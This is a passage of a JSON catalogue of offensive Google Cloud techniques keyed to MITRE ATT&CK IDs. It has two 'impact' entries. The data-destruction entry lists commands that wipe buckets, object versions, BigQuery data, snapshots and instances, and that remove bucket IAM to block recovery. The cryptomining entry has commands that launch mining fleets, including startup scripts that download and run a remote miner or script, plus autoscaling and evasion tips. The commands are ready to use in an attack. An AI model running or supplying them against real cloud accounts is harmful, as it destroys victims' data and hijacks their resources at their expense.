      "name": "GCS Data Destruction",
      "phase": "impact",
      "infrastructure": "gcp",
      "description": "Delete GCS bucket contents for ransomware or destruction",
      "prerequisites": ["Storage Object Admin role"],
      "tools": ["gsutil", "gcloud CLI"],
      "detection": "Cloud Audit Logs, deletion events",
      "references": ["https://attack.mitre.org/techniques/T1485/"],
      "next_techniques": [],
      "risk_level": "critical",
      "commands": [
        "# Delete all objects in a bucket",
        "gsutil -m rm -r gs://<BUCKET_NAME>/**",
        "# Delete bucket and all contents",
        "gsutil rm -r gs://<BUCKET_NAME>",
        "# Delete versioned objects (all versions)",
        "gsutil rm -a gs://<BUCKET_NAME>/**",
        "# Delete specific file",
        "gsutil rm gs://<BUCKET_NAME>/<FILE_PATH>",
        "# Parallel delete for speed",
        "gsutil -m rm gs://<BUCKET_NAME>/**",
        "# Delete with lifecycle policy (delayed destruction)",
        "gsutil lifecycle set lifecycle.json gs://<BUCKET_NAME>",
        "# lifecycle.json: {\"rule\": [{\"action\": {\"type\": \"Delete\"}, \"condition\": {\"age\": 0}}]}",
        "# List then delete (to log what was destroyed)",
        "gsutil ls gs://<BUCKET_NAME>/** > deleted_files.txt && gsutil -m rm gs://<BUCKET_NAME>/**",
        "# Remove bucket IAM to prevent recovery",
        "gsutil iam set /dev/null gs://<BUCKET_NAME>",
        "# Delete BigQuery dataset",
        "bq rm -r -f <DATASET_NAME>",
        "# Delete BigQuery table",
        "bq rm -f <DATASET_NAME>.<TABLE_NAME>",
        "# Delete Compute Engine disk snapshots",
        "for snap in $(gcloud compute snapshots list --format='value(name)'); do gcloud compute snapshots delete $snap --quiet; done",
        "# Delete Compute Engine instances",
        "gcloud compute instances delete <INSTANCE_NAME> --zone=<ZONE> --quiet",
        "# Delete Cloud SQL instance (if delete protection disabled)",
        "gcloud sql instances delete <INSTANCE_NAME> --quiet"
      ]
    },
    {
      "id": "GCP-IMPACT-002",
      "mitre_id": "T1496",
      "name": "GCP Cryptomining",
      "phase": "impact",
      "infrastructure": "gcp",
      "description": "Deploy Compute instances for cryptocurrency mining",
      "prerequisites": ["Compute Instance Admin role"],
      "tools": ["Mining software", "gcloud CLI"],
      "detection": "Billing alerts, Security Command Center findings",
      "references": ["https://attack.mitre.org/techniques/T1496/"],
      "next_techniques": [],
      "risk_level": "high",
      "commands": [
        "# Create high-CPU instance for mining",
        "gcloud compute instances create miner-1 --zone=<ZONE> --machine-type=n1-highcpu-96 --image-family=debian-11 --image-project=debian-cloud",
        "# Create instance with GPU for mining",
        "gcloud compute instances create gpu-miner --zone=<ZONE> --machine-type=n1-standard-4 --accelerator=type=nvidia-tesla-t4,count=1 --image-family=debian-11 --image-project=debian-cloud --maintenance-policy=TERMINATE",
        "# Create multiple mining instances",
        "for i in $(seq 1 10); do gcloud compute instances create miner-$i --zone=<ZONE> --machine-type=n1-highcpu-32 --async; done",
        "# Add startup script to install miner",
        "gcloud compute instances add-metadata miner-1 --zone=<ZONE> --metadata=startup-script='#!/bin/bash\\nwget -O /tmp/xmrig https://example.com/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig -o pool.example.com:3333 -u <WALLET>'",
        "# Create instance template for mining",
        "gcloud compute instance-templates create miner-template --machine-type=n1-highcpu-32 --metadata=startup-script='wget -O- https://example.com/mine.sh | bash'",
        "# Create managed instance group for scale",
        "gcloud compute instance-groups managed create miner-group --zone=<ZONE> --template=miner-template --size=50",
        "# Set autoscaling to maximize resource usage",
        "gcloud compute instance-groups managed set-autoscaling miner-group --zone=<ZONE> --max-num-replicas=100 --min-num-replicas=10 --target-cpu-utilization=0.95",
        "# Use preemptible instances to reduce cost/detection",
        "gcloud compute instances create preempt-miner --zone=<ZONE> --machine-type=n1-highcpu-32 --preemptible",
        "# Deploy mining via Cloud Run (serverless mining)",
        "gcloud run deploy miner --image=<MINING_IMAGE> --cpu=4 --memory=8Gi --concurrency=1",
        "# Use Cloud Build for mining (abuse build time)",
        "gcloud builds submit --config=mining-build.yaml .",
        "# Check billing to monitor cost impact",
        "gcloud beta billing accounts list",
        "# Create budget alert (for attacker monitoring)",
        "gcloud billing budgets create --billing-account=<ACCOUNT_ID> --display-name='Mining Budget' --budget-amount=1000"
      ]
    }
  ]
}
